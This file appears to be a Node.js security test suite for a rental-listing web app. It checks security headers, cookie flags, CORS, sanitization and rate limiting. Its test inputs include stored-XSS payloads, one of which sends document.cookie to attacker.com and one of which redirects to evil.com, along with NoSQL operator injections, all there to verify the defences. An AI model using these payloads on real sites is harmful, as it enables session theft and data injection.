const http = require("http");
const path = require("path");
const { fork } = require("child_process");
const mongoose = require("mongoose");
const env = require("../config/env");
const { cleanNoSql, cleanXss } = require("../middleware/sanitize.middleware");

const PORT = 8093; // Dedicated port for Phase 13 test suite
const BASE_URL = `http://localhost:${PORT}`;

let serverProc;

function createClient() {
	let cookies = {};

	return async function request(urlPath, options = {}) {
		const method = options.method || "GET";
		const headers = { ...(options.headers || {}) };

		const cookieHeader = Object.entries(cookies)
			.map(([k, v]) => `${k}=${v}`)
			.join("; ");
		if (cookieHeader) {
			headers["Cookie"] = cookieHeader;
		}

		let bodyBuffer = null;
		if (options.body) {
			if (Buffer.isBuffer(options.body)) {
				bodyBuffer = options.body;
			} else if (typeof options.body === "string") {
				bodyBuffer = Buffer.from(options.body);
				if (!headers["Content-Type"]) {
					headers["Content-Type"] = "application/x-www-form-urlencoded";
				}
			}
			headers["Content-Length"] = bodyBuffer.length;
		}

		return new Promise((resolve, reject) => {
			const req = http.request(
				`${BASE_URL}${urlPath}`,
				{
					method,
					headers,
				},
				(res) => {
					const setCookie = res.headers["set-cookie"];
					if (setCookie) {
						setCookie.forEach((cookieStr) => {
							const parts = cookieStr.split(";")[0].split("=");
							if (parts.length >= 2) {
								cookies[parts[0].trim()] = parts.slice(1).join("=").trim();
							}
						});
					}

					let data = "";
					res.on("data", (chunk) => (data += chunk));
					res.on("end", () => {
						resolve({
							status: res.statusCode,
							headers: res.headers,
							body: data,
							json: () => {
								try {
									return JSON.parse(data);
								} catch (e) {
									return null;
								}
							},
						});
					});
				},
			);

			req.on("error", reject);
			if (bodyBuffer) {
				req.write(bodyBuffer);
			}
			req.end();
		});
	};
}

function assert(condition, message) {
	if (!condition) {
		throw new Error(`Assertion Failed: ${message}`);
	}
}

async function runTests() {
	console.log("==========================================================");
	console.log("   WANDER-LUST PHASE 13 SECURITY & RATE LIMITING TESTS    ");
	console.log("==========================================================\n");

	// 1. Spawning Wander-Lust server on port 8093
	console.log(`1. Starting Wander-Lust test server on port ${PORT}...`);
	serverProc = fork(path.join(__dirname, "../server.js"), [], {
		env: { ...process.env, PORT: String(PORT) },
		stdio: "pipe",
	});

	await new Promise((resolve, reject) => {
		const timeout = setTimeout(() => {
			reject(new Error("Server startup timed out after 10 seconds"));
		}, 10000);

		serverProc.stdout.on("data", (data) => {
			const output = data.toString();
			if (output.includes(`listening on port ${PORT}`)) {
				clearTimeout(timeout);
				resolve();
			}
		});

		serverProc.stderr.on("data", (data) => {
			console.error("[Server Error]", data.toString());
		});

		serverProc.on("exit", (code) => {
			clearTimeout(timeout);
			if (code !== 0) {
				reject(new Error(`Server exited prematurely with code ${code}`));
			}
		});
	});
	console.log(`   [PASS] Server ready on port ${PORT}.\n`);

	const client = createClient();
	const timestamp = Date.now();
	const testUser = {
		username: `sec_user_${timestamp}`,
		email: `sec_user_${timestamp}@example.com`,
		password: "Password123!",
	};

	await mongoose.connect(env.DB_URL);

	// 2. Testing Security Headers (Helmet)
	console.log("2. Testing Helmet HTTP Security Headers...");
	const homeRes = await client("/listings");
	assert(homeRes.status === 200, "Home request should succeed");

	const headers = homeRes.headers;
	assert(headers["x-content-type-options"] === "nosniff", "x-content-type-options must be nosniff");
	assert(headers["x-frame-options"] === "SAMEORIGIN", "x-frame-options must be SAMEORIGIN");
	assert(headers["content-security-policy"], "Content Security Policy (CSP) header must be present");
	assert(
		headers["content-security-policy"].includes("cdn.jsdelivr.net"),
		"CSP must allow cdn.jsdelivr.net",
	);
	assert(
		headers["content-security-policy"].includes("images.unsplash.com"),
		"CSP must allow images.unsplash.com",
	);
	console.log("   [PASS] Security headers (X-Content-Type-Options, X-Frame-Options, CSP) validated.\n");

	// 3. Testing Session Cookie Security Flags
	console.log("3. Testing Session Cookie Security Attributes...");
	const setCookieHeader = homeRes.headers["set-cookie"];
	assert(setCookieHeader && setCookieHeader.length > 0, "Set-Cookie header must be emitted");
	const cookieString = setCookieHeader.join("; ");
	assert(cookieString.toLowerCase().includes("httponly"), "Cookie must specify HttpOnly flag");
	assert(cookieString.toLowerCase().includes("samesite=lax"), "Cookie must specify SameSite=Lax flag");
	console.log("   [PASS] Session cookie attributes (HttpOnly, SameSite=Lax) verified.\n");

	// 4. Testing CORS Options for REST API
	console.log("4. Testing CORS headers on REST API v1...");
	const corsRes = await client("/api/v1/listings", {
		method: "OPTIONS",
		headers: {
			Origin: "http://localhost:3000",
			"Access-Control-Request-Method": "GET",
		},
	});
	assert(
		corsRes.headers["access-control-allow-origin"] === "http://localhost:3000" ||
			corsRes.headers["access-control-allow-origin"] === "*",
		"CORS should allow valid origins",
	);
	console.log("   [PASS] CORS policies on REST API v1 verified.\n");

	// 5. Testing Unit Sanitization Functions (cleanNoSql & cleanXss)
	console.log("5. Testing NoSQL and XSS Sanitization Unit Functions...");
	const dirtyPayload = {
		title: "Valid Title <script>alert('hack')</script>",
		$where: "sleep(5000)",
		"nested.param": "injection",
		filters: {
			$gt: 100,
			category: "Villa",
		},
		tags: ["<script>evil()</script>safe", "clean"],
	};

	const cleaned = cleanNoSql(cleanXss(dirtyPayload));
	assert(cleaned.title === "Valid Title ", "Script tags must be stripped from title");
	assert(!("$where" in cleaned), "$where operator must be stripped");
	assert(!("nested.param" in cleaned), "Dotted keys must be stripped");
	assert(!("$gt" in cleaned.filters), "$gt operator must be stripped");
	assert(cleaned.filters.category === "Villa", "Safe keys must be preserved");
	assert(cleaned.tags[0] === "safe", "Array script tags must be stripped");
	console.log("   [PASS] Unit sanitization functions verified.\n");

	// 6. User Signup & Stored XSS Protection in Listing Pipeline
	console.log("6. Testing End-to-End Stored XSS Sanitization in Listing Creation...");
	const signupRes = await client("/signup", {
		method: "POST",
		body: `username=${testUser.username}&email=${testUser.email}&password=${testUser.password}`,
	});
	assert(signupRes.status === 302, "User signup must succeed");

	const listingWithXss = {
		listing: {
			title: "Secure Haven <script>alert(1)</script>",
			description: "Stunning valley view <script>document.cookie='stolen'</script>with fireplace.",
			price: 5500,
			location: "Shimla",
			country: "India",
			category: "Mountains",
			propertyType: "House",
			guests: 4,
		},
	};

	const createListingRes = await client("/api/v1/listings", {
		method: "POST",
		headers: { "Content-Type": "application/json" },
		body: JSON.stringify(listingWithXss),
	});
	assert(createListingRes.status === 201, "Listing creation must succeed");
	const savedListing = createListingRes.json().data;
	const listingId = savedListing._id;

	assert(!savedListing.title.includes("<script>"), "Title must not contain script tags");
	assert(!savedListing.description.includes("<script>"), "Description must not contain script tags");
	console.log(`   [PASS] Listing description and title sanitized (ID: ${listingId}).\n`);

	// 7. Testing NoSQL Query Injection Defense via HTTP Request
	console.log("7. Testing NoSQL Query Injection Defense via HTTP...");
	const injectionBody = {
		$gt: "",
		title: "Legit Title",
		description: "Legit Description",
		price: 3000,
		location: "Jaipur",
		country: "India",
	};

	const injectRes = await client(`/api/v1/listings`, {
		method: "POST",
		headers: { "Content-Type": "application/json" },
		body: JSON.stringify({ listing: injectionBody }),
	});
	assert(injectRes.status === 201, "Request with stripped operator should process safely");
	const sanitizedListing = injectRes.json().data;
	assert(!("$gt" in sanitizedListing), "Injected operator $gt must not exist in saved document");
	// Clean up second listing
	await client(`/api/v1/listings/${sanitizedListing._id}`, { method: "DELETE" });
	console.log("   [PASS] NoSQL injection operators successfully neutralized.\n");

	// 8. Testing Review Stored XSS Sanitization
	console.log("8. Testing Review Comment Stored XSS Sanitization...");
	const reviewerClient = createClient();
	const reviewerUser = `sec_reviewer_${Date.now()}`;
	await reviewerClient("/signup", {
		method: "POST",
		body: `username=${reviewerUser}&email=${reviewerUser}@example.com&password=Password123!`,
	});

	const reviewWithXss = {
		review: {
			rating: 5,
			comment: "Splendid stay! <script>fetch('http://attacker.com?c=' + document.cookie)</script>Highly recommended.",
			cleanliness: 5,
			accuracy: 5,
			communication: 5,
			location: 5,
			checkIn: 5,
			value: 5,
		},
	};

	const revRes = await reviewerClient(`/api/v1/listings/${listingId}/reviews`, {
		method: "POST",
		headers: { "Content-Type": "application/json" },
		body: JSON.stringify(reviewWithXss),
	});
	assert(revRes.status === 201, "Review creation should succeed");
	const savedReview = revRes.json().data;
	assert(!savedReview.comment.includes("<script>"), "Review comment must not contain script tags");
	console.log("   [PASS] Review comment sanitized successfully.\n");

	// 9. Testing Messaging Stored XSS Sanitization
	console.log("9. Testing Messaging Stored XSS Sanitization...");
	const msgClient2 = createClient();
	const user2Name = `sec_sender_${Date.now()}`;
	await msgClient2("/signup", {
		method: "POST",
		body: `username=${user2Name}&email=${user2Name}@example.com&password=Password123!`,
	});

	const msgRes = await msgClient2("/api/v1/conversations/inquiry", {
		method: "POST",
		headers: { "Content-Type": "application/json" },
		body: JSON.stringify({
			listingId: listingId,
			message: "Is early checkin allowed? <script>window.location='http://evil.com'</script>",
		}),
	});
	assert(msgRes.status === 201, "Inquiry creation should succeed");
	const conv = msgRes.json().data;
	assert(!conv.lastMessage.text.includes("<script>"), "Message text must not contain script tags");
	console.log("   [PASS] Messaging inquiry sanitized successfully.\n");

	// 10. Testing Authentication Rate Limiting
	console.log("10. Testing Authentication Rate Limiting on /login...");
	// Send 3 requests with x-test-rate-limit: "true" (limit is 3)
	for (let i = 1; i <= 3; i++) {
		const reqRes = await client("/login", {
			method: "POST",
			headers: { "x-test-rate-limit": "true" },
			body: "username=fake_attacker&password=wrongpassword",
		});
		// Should be 302 (failed auth redirect)
		assert(reqRes.status === 302, `Request ${i} should return 302 redirect`);
	}

	// 4th request must exceed the threshold and trigger HTTP 429
	const rateLimitedRes = await client("/login", {
		method: "POST",
		headers: {
			"x-test-rate-limit": "true",
			Accept: "application/json",
		},
		body: "username=fake_attacker&password=wrongpassword",
	});
	assert(rateLimitedRes.status === 429, "4th login attempt must return HTTP 429 Too Many Requests");
	assert(
		rateLimitedRes.json().message.includes("Too many"),
		"Response should explain rate limit tripping",
	);
	console.log("   [PASS] Authentication rate limiter tripped at threshold (HTTP 429 verified).\n");

	// 11. Testing API Rate Limiting on /api/v1/*
	console.log("11. Testing REST API v1 Rate Limiting...");
	// Send 5 requests with x-test-rate-limit: "true" (limit is 5)
	for (let i = 1; i <= 5; i++) {
		const apiGetRes = await client("/api/v1/listings", {
			method: "GET",
			headers: { "x-test-rate-limit": "true" },
		});
		assert(apiGetRes.status === 200, `API request ${i} should return 200`);
	}

	// 6th request must trip rate limiter
	const rateLimitedApiRes = await client("/api/v1/listings", {
		method: "GET",
		headers: { "x-test-rate-limit": "true" },
	});
	assert(rateLimitedApiRes.status === 429, "6th API call must return HTTP 429 Too Many Requests");
	assert(
		rateLimitedApiRes.json().message.includes("Too many API requests"),
		"API 429 message verified",
	);
	console.log("   [PASS] REST API rate limiter tripped at threshold (HTTP 429 verified).\n");

	// 12. Testing Normal Requests are NOT Rate Limited without Test Header
	console.log("12. Testing standard requests are unhindered under normal thresholds...");
	const normalRes = await client("/api/v1/listings");
	assert(normalRes.status === 200, "Standard request without test limiter header must return 200");
	console.log("   [PASS] Standard traffic flows unobstructed.\n");

	// 13. Cleaning up test listing and data
	console.log("13. Cleaning up test listing & records...");
	await client(`/api/v1/listings/${listingId}`, { method: "DELETE" });
	console.log("   [PASS] Cleaned up test property.\n");

	console.log("==========================================================");
	console.log("   ALL 13 PHASE 13 AUTOMATED TESTS PASSED SUCCESSFULLY!   ");
	console.log("==========================================================");
}

let exitCode = 0;
runTests()
	.catch((err) => {
		console.error("\n[TEST FAILED]:", err.message);
		if (err.stack) console.error(err.stack);
		exitCode = 1;
	})
	.finally(async () => {
		if (serverProc) {
			serverProc.kill("SIGTERM");
		}
		try {
			await mongoose.disconnect();
		} catch (e) {}
		process.exit(exitCode);
	});
